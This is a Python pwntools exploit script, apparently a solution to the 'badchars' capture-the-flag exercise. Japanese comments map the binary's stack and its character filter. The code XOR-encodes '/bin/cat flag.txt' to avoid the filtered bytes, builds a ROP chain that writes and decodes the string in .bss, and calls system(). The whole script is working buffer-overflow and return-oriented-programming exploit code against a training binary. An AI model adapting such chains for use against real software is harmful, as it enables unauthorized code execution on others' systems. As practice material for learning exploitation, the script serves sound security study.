"""
rbp-0x28 := malloc(200)
rbp-0x30 = nsize

nstrlen :改行までの文字数(改行含む）
rbp-0x18 : string
rbp-0x20 : size
rbp-0x08 : count

checkBadchars :特定の文字を検知し、条件にハマる文字を0xebに置き換える
rbp-0x20~19 : [ 'b', 'i', 'c', '/', ' ', 'f', 'n', 's' ]
rbp-0x30 : nsize
rbp-0x28 : malloc
rbp-0x10 : for i 0 to 7
rbp-0x08 : for j 0 < nsize
"""

from pwn import *
#context.log_level = 'debug'
elf = ELF("./badchars")
p = process("./badchars")
#p = remote("localhost", 7777 )

command = b'/bin/cat flag.txt'
en_command = b''
for i in range( len( command ) ):
    if command[i].to_bytes(1, 'big' ) not in [b'b',b'i',b'c',b'/',b' ',b'f',b'n',b's']:
        en_command += command[i].to_bytes( 1, 'big' )
    else:
        b = command[i]^0xff
        en_command += b.to_bytes( 1, 'big' )
info("command :%s", command )
info("en_command :%s", en_command )
bss = 0x601080

payload = b''
payload += b'A'*0x20
payload += b'BBBBBBBB'
payload += p64( 0x400b39 + 1) #ret
for i in range( 0, len( en_command ), 8 ):
    payload += p64( 0x400b3b ) #pop r12;pop r13;ret
    payload += en_command[i:i+8].ljust( 8, b'\0' )
    payload += p64( bss + i )
    payload += p64( 0x400b34 ) #mov Q[r13], r12

for i in range( 0, len( command ) ):
    if command[i] != en_command[i]:
        payload += p64( 0x400b40 ) #pop r14;pop r15
        payload += p64( 0xff )
        payload += p64( bss+i )
        payload += p64( 0x400b30 ) #xor B[r15], r14
payload += p64( 0x400b39 ) #pop rdi;ret
payload += p64( bss )
payload += p64( elf.plt["system"] )
        
p.recvuntil("\n> ") 
p.sendline( payload )
info("flag :%s", p.recv() )
